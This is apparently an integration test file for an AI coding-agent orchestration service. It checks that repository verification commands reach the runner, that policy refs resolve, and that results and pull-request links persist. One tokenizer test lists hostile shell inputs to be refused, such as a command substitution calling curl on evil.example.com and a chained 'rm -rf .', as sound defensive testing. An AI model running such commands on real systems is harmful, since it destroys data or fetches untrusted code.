// EXECUTION E10 — the four seams where the pipeline did not join up.
//
// Every test here runs against real dependencies: a real PGlite database with
// the real forward migrations, the real Phase4Coordinator / Phase4EventProcessor
// / AttentionService / ProjectResumeService, the real StrategyBridgeService
// materialization path, the real runner verification-policy resolver, and real
// Git repositories with real child processes for the fail-closed cases. There
// is one injected seam (a fake clock) and no mocked collaborators. This repo's
// own conventions record that mocks have concealed four dead code paths here,
// and three of the four bugs this phase fixes are exactly the kind that a
// mocked coordinator or a mocked verifier reports as green.

import { execFile } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { resolve } from "node:path";
import { promisify } from "node:util";
import { PGlite } from "@electric-sql/pglite";
import { V2_DEFAULT_VERIFICATION_POLICY_REF } from "@norns/contracts";
import {
  CommandPolicyVerifier,
  DEFAULT_VERIFICATION_POLICY_REF,
  runnerVerificationPolicies,
} from "@norns/runner";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { Phase4Coordinator } from "../src/coordinator/phase4Coordinator.js";
import { Phase4DispatchRepository } from "../src/coordinator/phase4Dispatcher.js";
import { Phase4EventProcessor } from "../src/coordinator/phase4EventProcessor.js";
import { tokenizeVerificationCommand } from "../src/coordinator/verificationCommandSource.js";
import { PGliteTransactionRunner } from "../src/persistence/v2/database.js";
import { type V2MigrationDatabase, runCurrentV2Migrations } from "../src/persistence/v2/migrate.js";
import { AttentionService } from "../src/projects/attentionService.js";
import { PhaseWorkflowService } from "../src/projects/phaseWorkflowService.js";
import { ProjectResumeService } from "../src/projects/projectResumeService.js";
import { StrategyBridgeService } from "../src/projects/strategyBridgeService.js";
import { StrategyWorkflowService } from "../src/projects/strategyWorkflowService.js";
import { hashCurrentPassword } from "../src/users/passwords.js";

const execFileAsync = promisify(execFile);

const GIT_ENV = {
  ...process.env,
  GIT_AUTHOR_NAME: "E10 Test",
  GIT_AUTHOR_EMAIL: "e10@example.com",
  GIT_COMMITTER_NAME: "E10 Test",
  GIT_COMMITTER_EMAIL: "e10@example.com",
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_SYSTEM: "/dev/null",
};

async function git(cwd: string, ...args: string[]): Promise<string> {
  const { stdout } = await execFileAsync("git", ["-C", cwd, ...args], { env: GIT_ENV });
  return stdout.trim();
}

// ---------------------------------------------------------------------------
// Shared relational fixture: one project, phase, task, assignment and runner,
// built through the real migrations so every column under test really exists.
// ---------------------------------------------------------------------------

async function seedExecutableProject(pg: PGlite): Promise<void> {
  await pg.exec(`
    CREATE ROLE norns_app NOLOGIN;
    CREATE TABLE norns_state (
      key TEXT PRIMARY KEY,
      snapshot JSONB NOT NULL,
      updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
    );
  `);
  await runCurrentV2Migrations(pg as unknown as V2MigrationDatabase);
  await pg.query(
    `INSERT INTO users (
       id, username, display_name, email, name, password_hash,
       password_hash_scheme, role, status
     ) VALUES ('admin-1','admin@example.com','admin@example.com','admin@example.com',
       'admin@example.com',$1,'scrypt-v1','admin','active')`,
    [await hashCurrentPassword("test-password")],
  );
  await pg.exec(`
    INSERT INTO projects (
      id, name, description, status, assignment_policy_ref,
      verification_policy_ref, budget_policy_ref
    ) VALUES ('project-1','Project One','','active','assignment',
      '${V2_DEFAULT_VERIFICATION_POLICY_REF}','budget');
    INSERT INTO repository_bindings (
      id, project_id, binding_type, status, runner_id, workspace_id,
      repository_id, repository_display_name, granted_permissions,
      default_branch, observed_head, verification_policy_ref,
      repository_health, created_by_actor_type, created_by_actor_id
    ) VALUES ('binding-1','project-1','local_runner','connected','runner-1',
      'workspace-1','repository-1','Project One','{}'::jsonb,'main','commit-1',
      '${V2_DEFAULT_VERIFICATION_POLICY_REF}','healthy','human','admin-1');
    UPDATE projects SET primary_repository_binding_id = 'binding-1' WHERE id = 'project-1';
    INSERT INTO phases (
      id, project_id, objective_summary, priority, status, approved_budget_usd
    ) VALUES ('phase-1','project-1','Implement vertical slice',1,'approved',20);
    INSERT INTO strategy_versions (
      id, project_id, phase_id, version, status, objective, content,
      convergence, review_rounds, content_hash
    ) VALUES ('strategy-1','project-1','phase-1',1,'approved','Vertical slice',
      '{}'::jsonb,'converged',1,repeat('a',64));
    UPDATE phases SET approved_strategy_version_id='strategy-1' WHERE id='phase-1';
    INSERT INTO objectives (
      id, project_id, phase_id, outcome, success_measures, status, "order"
    ) VALUES ('objective-1','project-1','phase-1','One completed task',
      '["task completes"]'::jsonb,'active',0);
    INSERT INTO tasks (
      id, project_id, phase_id, objective_id, strategy_version_id, title,
      description, deliverables, acceptance_criteria, complexity, risk,
      required_roles, required_capabilities, required_inputs, expected_outputs,
      environment_policy_ref, verification_policy_ref, state, lifecycle_version
    ) VALUES ('task-1','project-1','phase-1','objective-1','strategy-1','Do work',
      'Complete the vertical slice','["change"]'::jsonb,'["verified"]'::jsonb,
      'M','medium','["implementation"]'::jsonb,'[]'::jsonb,'[]'::jsonb,
      '["commit"]'::jsonb,'environment','${V2_DEFAULT_VERIFICATION_POLICY_REF}','pending',0);
    INSERT INTO agent_profiles (
      id, provider, runtime, model, roles, capabilities, context_limit_tokens,
      security_restrictions, status, active_workload, cost_metadata
    ) VALUES ('agent-1','openai','codex','gpt-5-codex','["implementation"]'::jsonb,
      '["typescript"]'::jsonb,200000,'[]'::jsonb,'available',0,
      '{"billing_mode":"subscription"}'::jsonb);
    INSERT INTO agent_assignments (
      id, project_id, phase_id, task_id, agent_profile_id, status, rationale,
      rationale_factors, budget_limit_usd, allocation_policy_ref
    ) VALUES ('assignment-1','project-1','phase-1','task-1','agent-1','proposed',
      'Best implementation agent','["capability"]'::jsonb,10,'allocation');
  `);
}

async function recordRepositoryFact(pg: PGlite, id: string, content: string): Promise<void> {
  await pg.query(
    `INSERT INTO project_memory_entries (
       id, project_id, category, content, provenance, confidence, version, status
     ) VALUES ($1,'project-1','repository_fact',$2,'repository_ingestion',1,1,'active')`,
    [id, content],
  );
}

function scheduleInput() {
  return {
    project_id: "project-1",
    phase_id: "phase-1",
    task_id: "task-1",
    assignment_id: "assignment-1",
    runner_id: "runner-1",
    runner_generation: 3,
    authorized_by: { actor_type: "human" as const, actor_id: "admin-1" },
    authorized_by_session_id: "session-1",
    correlation_id: "correlation-1",
    causation_id: null,
    context_refs: [
      {
        artifact_id: "prompt-1",
        content_hash: "b".repeat(64),
        byte_size: 12,
        storage_ref: "relay://artifacts/prompt-1",
      },
    ],
    target_branch: "norns/task-1",
    worktree_policy_ref: "worktree-default",
    sandbox_policy_ref: "sandbox-default",
    max_input_tokens: 10_000,
    max_output_tokens: 4_000,
    max_duration_seconds: 900,
    issued_at: "2026-07-21T20:00:00.000Z",
    expires_at: "2026-07-21T20:15:00.000Z",
  };
}

// ---------------------------------------------------------------------------
// SEAM 1 — the project's real verification commands reach the runner.
// ---------------------------------------------------------------------------

describe.sequential("EXECUTION E10 — verification commands reach the runner", () => {
  let pg: PGlite;
  let coordinator: Phase4Coordinator;

  beforeEach(async () => {
    pg = new PGlite();
    await seedExecutableProject(pg);
    coordinator = new Phase4Coordinator(new PGliteTransactionRunner(pg));
  });

  afterEach(async () => {
    await pg.close();
  });

  it("carries the project's ingested build/test/lint commands on the dispatch command", async () => {
    await recordRepositoryFact(pg, "memory-build", "build_command: pnpm run build");
    await recordRepositoryFact(pg, "memory-test", "test_command: pnpm test");
    await recordRepositoryFact(pg, "memory-lint", "lint_command: pnpm exec biome check");
    // A non-policy fact must not leak into the executable set.
    await recordRepositoryFact(pg, "memory-lang", "primary_language: TypeScript");

    const result = await coordinator.schedule(scheduleInput());

    expect(result.command.verification_commands).toEqual([
      { name: "build", command: ["pnpm", "run", "build"] },
      { name: "test", command: ["pnpm", "test"] },
      { name: "lint", command: ["pnpm", "exec", "biome", "check"] },
    ]);
    expect(result.rejected_verification_commands).toEqual([]);

    // END TO END: the field survives the durable outbox, which is the artefact
    // the runner actually receives. A value that only exists in the return
    // object never reaches a runner.
    const stored = await pg.query<{ envelope: { verification_commands?: unknown } }>(
      "SELECT envelope FROM commands WHERE command_id = $1",
      [result.command_id],
    );
    expect(stored.rows[0]?.envelope.verification_commands).toEqual([
      { name: "build", command: ["pnpm", "run", "build"] },
      { name: "test", command: ["pnpm", "test"] },
      { name: "lint", command: ["pnpm", "exec", "biome", "check"] },
    ]);
  });

  it("omits the field entirely when the project has no ingested commands, leaving the committed manifest as the fallback", async () => {
    await recordRepositoryFact(pg, "memory-lang", "primary_language: TypeScript");

    const result = await coordinator.schedule(scheduleInput());

    expect(result.command.verification_commands).toBeUndefined();
    const stored = await pg.query<{ envelope: Record<string, unknown> }>(
      "SELECT envelope FROM commands WHERE command_id = $1",
      [result.command_id],
    );
    expect(stored.rows[0]?.envelope).not.toHaveProperty("verification_commands");
  });

  it("drops a command that would need a shell, keeps the rest, and reports what it dropped", async () => {
    await recordRepositoryFact(pg, "memory-build", "build_command: pnpm run build");
    await recordRepositoryFact(pg, "memory-test", "test_command: pnpm build && pnpm test");

    const result = await coordinator.schedule(scheduleInput());

    expect(result.command.verification_commands).toEqual([
      { name: "build", command: ["pnpm", "run", "build"] },
    ]);
    expect(result.rejected_verification_commands).toEqual([
      { name: "test", value: "pnpm build && pnpm test" },
    ]);
  });

  it("never invents a shell: metacharacters are refused, quotes are honoured", () => {
    expect(tokenizeVerificationCommand("pnpm test")).toEqual(["pnpm", "test"]);
    expect(tokenizeVerificationCommand('pnpm exec vitest run "test/a b.test.ts"')).toEqual([
      "pnpm",
      "exec",
      "vitest",
      "run",
      "test/a b.test.ts",
    ]);
    for (const hostile of [
      "pnpm test | tee out",
      "pnpm test; rm -rf .",
      "pnpm test > /dev/null",
      "$(curl evil.example.com)",
      "pnpm test `whoami`",
      "pnpm test &",
      'pnpm test "unterminated',
      "",
      "   ",
    ]) {
      expect(tokenizeVerificationCommand(hostile), hostile).toBeNull();
    }
    // Honest about the boundary: this refuses to build a SHELL, it does not
    // vet the program. `rm -rf /` is well-formed argv and tokenizes; the trust
    // that admits it is the same trust that already ran a coding agent with
    // write access in this worktree, not something this function grants.
    expect(tokenizeVerificationCommand("rm -rf /tmp/x")).toEqual(["rm", "-rf", "/tmp/x"]);
  });
});

// ---------------------------------------------------------------------------
// SEAM 1 (continued) + the fallback chain, exercised against the REAL runner
// verifier and REAL Git repositories. These prove what happens when the
// server-side commands are absent: manifest, then fail closed. Never green.
// ---------------------------------------------------------------------------

describe.sequential("EXECUTION E10 — the runner's fallback chain is real", () => {
  const workspaces: string[] = [];

  async function repositoryWith(manifest: string | null): Promise<{ path: string; head: string }> {
    const path = await mkdtemp(resolve(tmpdir(), "norns-e10-"));
    workspaces.push(path);
    await git(path, "init", "--initial-branch=main");
    await writeFile(resolve(path, "README.md"), "base\n");
    await git(path, "add", ".");
    await git(
      path,
      "-c",
      "user.name=E10",
      "-c",
      "user.email=e10@example.com",
      "commit",
      "-m",
      "base",
    );
    const base = await git(path, "rev-parse", "HEAD");
    await writeFile(resolve(path, "work.txt"), "work\n");
    if (manifest !== null) {
      await execFileAsync("mkdir", ["-p", resolve(path, ".norns")]);
      await writeFile(resolve(path, ".norns", "verification.json"), manifest);
    }
    await git(path, "add", ".");
    await git(
      path,
      "-c",
      "user.name=E10",
      "-c",
      "user.email=e10@example.com",
      "commit",
      "-m",
      "work",
    );
    const head = await git(path, "rev-parse", "HEAD");
    expect(head).not.toBe(base);
    return { path, head };
  }

  afterEach(async () => {
    for (const path of workspaces.splice(0)) await rm(path, { recursive: true, force: true });
  });

  it("falls back to the committed manifest when the policy ref is unknown to this runner", async () => {
    const repository = await repositoryWith(
      JSON.stringify({ commands: [{ name: "test", command: ["git", "--version"] }] }),
    );
    const verifier = new CommandPolicyVerifier(runnerVerificationPolicies("{}"));

    const result = await verifier.verify({
      worktree_path: repository.path,
      policy_ref: "some-unknown-policy",
      expected_commit: repository.head,
      base_revision: `${repository.head}~1`,
    });

    expect(result.passed).toBe(true);
    expect(result.command_results.map((entry) => entry.name)).toEqual(["test"]);
  });

  it("FAILS CLOSED when there is neither an approved policy nor a committed manifest", async () => {
    const repository = await repositoryWith(null);
    const verifier = new CommandPolicyVerifier(runnerVerificationPolicies("{}"));

    const result = await verifier.verify({
      worktree_path: repository.path,
      policy_ref: "some-unknown-policy",
      expected_commit: repository.head,
      base_revision: `${repository.head}~1`,
    });

    expect(result.passed).toBe(false);
    expect(result.reason).toMatch(/not approved on this runner/);
    expect(result.reason).toMatch(/\.norns\/verification\.json/);
    expect(result.command_results).toEqual([]);
  });

  it("reports the FAILING command's real exit code and output rather than a digest", async () => {
    const repository = await repositoryWith(
      JSON.stringify({
        commands: [
          { name: "test", command: ["git", "--version"] },
          {
            name: "lint",
            command: ["git", "cat-file", "-e", "0000000000000000000000000000000000000000"],
          },
        ],
      }),
    );
    const verifier = new CommandPolicyVerifier(runnerVerificationPolicies("{}"));

    const result = await verifier.verify({
      worktree_path: repository.path,
      policy_ref: "some-unknown-policy",
      expected_commit: repository.head,
      base_revision: `${repository.head}~1`,
    });

    expect(result.passed).toBe(false);
    const failing = result.command_results.filter((entry) => !entry.passed);
    expect(failing).toHaveLength(1);
    expect(failing[0]?.name).toBe("lint");
    expect(failing[0]?.exit_code).not.toBe(0);
  });
});

// ---------------------------------------------------------------------------
// SEAM 2 — the policy-ref vocabulary, and the default that could not resolve.
// ---------------------------------------------------------------------------

describe.sequential("EXECUTION E10 — the default policy ref actually resolves", () => {
  let pg: PGlite;

  beforeEach(async () => {
    pg = new PGlite();
    await seedExecutableProject(pg);
  });

  afterEach(async () => {
    await pg.close();
  });

  it("keeps ONE vocabulary: the server constant is the runner's default map key", () => {
    expect(V2_DEFAULT_VERIFICATION_POLICY_REF).toBe(DEFAULT_VERIFICATION_POLICY_REF);
    expect(
      runnerVerificationPolicies(undefined).get(V2_DEFAULT_VERIFICATION_POLICY_REF),
    ).toBeTruthy();
    // The pre-E10 spelling was a bare word that no runner could look up. If it
    // ever becomes resolvable again, this assertion is the place to notice.
    expect(runnerVerificationPolicies(undefined).get("verification")).toBeUndefined();
  });

  it("a strategy materialized through the NORMAL path produces a policy ref the runner can resolve", async () => {
    const transactions = new PGliteTransactionRunner(pg);
    const bridge = new StrategyBridgeService({
      transactions,
      phases: new PhaseWorkflowService(transactions),
      strategies: new StrategyWorkflowService(transactions),
      now: () => new Date("2026-07-21T12:00:00.000Z"),
    });
    await pg.query(
      `INSERT INTO planning_runs (
         id, project_id, status, round, max_rounds, objective, transcript, result, total_cost_usd
       ) VALUES ('run-e10','project-1','converged',1,3,'Ship it',$1::jsonb,$2::jsonb,0.5)`,
      [
        JSON.stringify([
          {
            round: 1,
            role: "pm",
            provider: "anthropic",
            model: "claude-sonnet-x",
            summary: "Drafted the plan.",
            finding_counts: null,
          },
          {
            round: 1,
            role: "reviewer",
            provider: "openai",
            model: "gpt-review-x",
            summary: "Reviewed the plan.",
            finding_counts: { must_fix: 0, should_fix: 0, suggestion: 0 },
          },
        ]),
        JSON.stringify({
          plan: {
            objective: "Ship the vertical slice",
            assumptions: ["The relational runtime is available"],
            modules: [
              {
                id: "mod-a",
                title: "Module mod-a",
                description: "Do the work of module mod-a.",
                deliverables: ["Deliverable for mod-a"],
                acceptance: [
                  {
                    id: "mod-a-ac-1",
                    statement: "Module mod-a passes its verification",
                    verification_type: "test",
                    verification: "pnpm test mod-a",
                  },
                ],
                estimated_complexity: "M",
                risk: "medium",
              },
            ],
            risks: [{ description: "Scope creep", mitigation: "Freeze the plan" }],
            out_of_scope: ["Full reskin"],
          },
          content_hash: "a".repeat(64),
          total_cost_usd: 0.5,
          staffing_proposal: {
            summary: "Single-module staffing.",
            recommendations: [
              {
                node_id: "mod-a",
                provider: "anthropic",
                model: "claude-sonnet-x",
                worker_count: 1,
                reviewer_model: "gpt-review-x",
                budget_usd: 12,
                rationale: "Medium complexity; Claude implements, GPT reviews.",
              },
            ],
          },
        }),
      ],
    );

    const review = await bridge.createPhaseFromPlanningRun({
      projectId: "project-1",
      planningRunId: "run-e10",
      actor: { actor_id: "admin-1" },
    });
    await bridge.approve({
      projectId: "project-1",
      phaseId: review.phase.id,
      actor: { actor_id: "admin-1" },
    });

    const materialized = await pg.query<{ verification_policy_ref: string }>(
      "SELECT verification_policy_ref FROM tasks WHERE phase_id = $1",
      [review.phase.id],
    );
    expect(materialized.rows).not.toHaveLength(0);
    const policies = runnerVerificationPolicies(undefined);
    for (const row of materialized.rows) {
      // The bug: this was "verification", which is not a key in the runner's
      // default policy map, so a default deployment could not verify at all.
      expect(policies.get(row.verification_policy_ref), row.verification_policy_ref).toBeTruthy();
    }
  });
});

// ---------------------------------------------------------------------------
// SEAMS 3 and 4 — real command results, and the published branch / PR, both
// persisted from runner events and readable in the read models a human uses.
// ---------------------------------------------------------------------------

describe.sequential("EXECUTION E10 — results and publication reach the read models", () => {
  let pg: PGlite;
  let coordinator: Phase4Coordinator;
  let events: Phase4EventProcessor;
  let attention: AttentionService;
  let resume: ProjectResumeService;

  beforeEach(async () => {
    pg = new PGlite();
    await seedExecutableProject(pg);
    const transactions = new PGliteTransactionRunner(pg);
    coordinator = new Phase4Coordinator(transactions);
    events = new Phase4EventProcessor(transactions);
    attention = new AttentionService(transactions);
    resume = new ProjectResumeService(transactions);
  });

  afterEach(async () => {
    await pg.close();
  });

  // Drives the REAL dispatch repository so the run reaches `dispatched`
  // through the lifecycle machinery rather than an UPDATE that would bypass
  // agent_runs' own check constraints.
  async function dispatchAndStart(): Promise<string> {
    const scheduled = await coordinator.schedule(scheduleInput());
    const dispatch = new Phase4DispatchRepository(new PGliteTransactionRunner(pg));
    const claimed = await dispatch.claim("dispatcher-e10", 30_000);
    expect(claimed?.command.command_id).toBe(scheduled.command_id);
    await dispatch.markDelivered(
      scheduled.dispatch_job_id,
      "dispatcher-e10",
      "2026-07-21T20:00:30.000Z",
    );
    await events.apply({
      protocol: 1,
      event_seq: 1,
      runner_id: "runner-1",
      generation: 3,
      correlation_id: "correlation-1",
      causation_id: null,
      occurred_at: "2026-07-21T20:01:00.000Z",
      payload: { kind: "run_status", run_id: scheduled.run_id, status: "started" },
    });
    return scheduled.run_id;
  }

  it("persists REAL per-command results, including the failing command's output", async () => {
    const runId = await dispatchAndStart();

    await events.apply({
      protocol: 1,
      event_seq: 2,
      runner_id: "runner-1",
      generation: 3,
      correlation_id: "correlation-1",
      causation_id: null,
      occurred_at: "2026-07-21T20:05:00.000Z",
      payload: {
        kind: "verification_result",
        node_id: "task-1",
        commit_sha: "c".repeat(40),
        passed: false,
        output_digest: "d".repeat(64),
        command_results: [
          {
            name: "build",
            command: ["pnpm", "run", "build"],
            exit_code: 0,
            passed: true,
            output: "build ok",
          },
          {
            name: "test",
            command: ["pnpm", "test"],
            exit_code: 1,
            passed: false,
            output: "FAIL src/thing.test.ts\n  expected 3 to equal 4",
          },
        ],
      },
    });

    // Persisted, not the hardcoded '[]'::jsonb the processor used to write.
    const stored = await pg.query<{ command_results: unknown[] }>(
      "SELECT command_results FROM verification_results WHERE run_id = $1",
      [runId],
    );
    expect(stored.rows[0]?.command_results).toEqual([
      {
        name: "build",
        command: ["pnpm", "run", "build"],
        exit_code: 0,
        passed: true,
        output: "build ok",
      },
      {
        name: "test",
        command: ["pnpm", "test"],
        exit_code: 1,
        passed: false,
        output: "FAIL src/thing.test.ts\n  expected 3 to equal 4",
      },
    ]);

    // READABLE where a human looks: the phase read model names the failing
    // command and carries its output, instead of a red badge over a digest.
    const phase = await attention.phase("project-1", "phase-1");
    const task = phase.tasks.find((entry) => entry.id === "task-1");
    expect(task?.run?.verification_status).toBe("failed");
    expect(task?.failed_verification_commands).toEqual([
      {
        name: "test",
        command: ["pnpm", "test"],
        exit_code: 1,
        output: "FAIL src/thing.test.ts\n  expected 3 to equal 4",
      },
    ]);
  });

  it("records nothing rather than something false when a legacy runner sends no results", async () => {
    const runId = await dispatchAndStart();

    await events.apply({
      protocol: 1,
      event_seq: 2,
      runner_id: "runner-1",
      generation: 3,
      correlation_id: "correlation-1",
      causation_id: null,
      occurred_at: "2026-07-21T20:05:00.000Z",
      // No `command_results` key at all: the pre-E10 wire shape.
      payload: {
        kind: "verification_result",
        node_id: "task-1",
        commit_sha: "c".repeat(40),
        passed: true,
        output_digest: "d".repeat(64),
      },
    });

    const stored = await pg.query<{ command_results: unknown[] }>(
      "SELECT command_results FROM verification_results WHERE run_id = $1",
      [runId],
    );
    expect(stored.rows[0]?.command_results).toEqual([]);
    const phase = await attention.phase("project-1", "phase-1");
    expect(phase.tasks[0]?.failed_verification_commands).toEqual([]);
  });

  it("persists the published branch and pull request, and surfaces them in both read models", async () => {
    const runId = await dispatchAndStart();

    await events.apply({
      protocol: 1,
      event_seq: 2,
      runner_id: "runner-1",
      generation: 3,
      correlation_id: "correlation-1",
      causation_id: null,
      occurred_at: "2026-07-21T20:06:00.000Z",
      payload: {
        kind: "run_published",
        run_id: runId,
        outcome: "pushed",
        branch: "norns/task-1",
        commit_sha: "c".repeat(40),
        remote: "origin",
        pull_request_url: "https://github.com/acme/repo/pull/42",
        pull_request_note: null,
      },
    });

    const stored = await pg.query<{
      published_branch: string | null;
      pull_request_url: string | null;
      published_remote: string | null;
      publication_outcome: string | null;
    }>(
      `SELECT published_branch, pull_request_url, published_remote, publication_outcome
         FROM agent_runs WHERE id = $1`,
      [runId],
    );
    expect(stored.rows[0]).toMatchObject({
      published_branch: "norns/task-1",
      pull_request_url: "https://github.com/acme/repo/pull/42",
      published_remote: "origin",
      publication_outcome: "pushed",
    });

    const phase = await attention.phase("project-1", "phase-1");
    expect(phase.tasks[0]?.run).toMatchObject({
      published_branch: "norns/task-1",
      pull_request_url: "https://github.com/acme/repo/pull/42",
    });

    // And on the resume surface, once the task is complete: a human clicks
    // from a completed task straight through to its review.
    // The database refuses a completed task without evidence, so the fixture
    // supplies it rather than disabling the constraint.
    await pg.query(
      `UPDATE tasks
          SET state='completed', completed_at=now(),
              review_evidence='[{"label":"review"}]'::jsonb,
              completion_evidence='[{"label":"commit"}]'::jsonb
        WHERE id='task-1'`,
    );
    const payload = await resume.open("project-1");
    expect(payload.recent_completions).toEqual([
      expect.objectContaining({
        task_id: "task-1",
        pull_request_url: "https://github.com/acme/repo/pull/42",
        published_branch: "norns/task-1",
      }),
    ]);
  });

  it("explains a missing pull request instead of leaving it silently null", async () => {
    const runId = await dispatchAndStart();

    await events.apply({
      protocol: 1,
      event_seq: 2,
      runner_id: "runner-1",
      generation: 3,
      correlation_id: "correlation-1",
      causation_id: null,
      occurred_at: "2026-07-21T20:06:00.000Z",
      payload: {
        kind: "run_published",
        run_id: runId,
        outcome: "local_only",
        branch: "norns/task-1",
        commit_sha: "c".repeat(40),
        remote: null,
        pull_request_url: null,
        pull_request_note: "no GitHub token is configured on this runner",
      },
    });

    const phase = await attention.phase("project-1", "phase-1");
    expect(phase.tasks[0]?.run).toMatchObject({
      published_branch: "norns/task-1",
      pull_request_url: null,
      publication_note: "no GitHub token is configured on this runner",
    });
  });
});
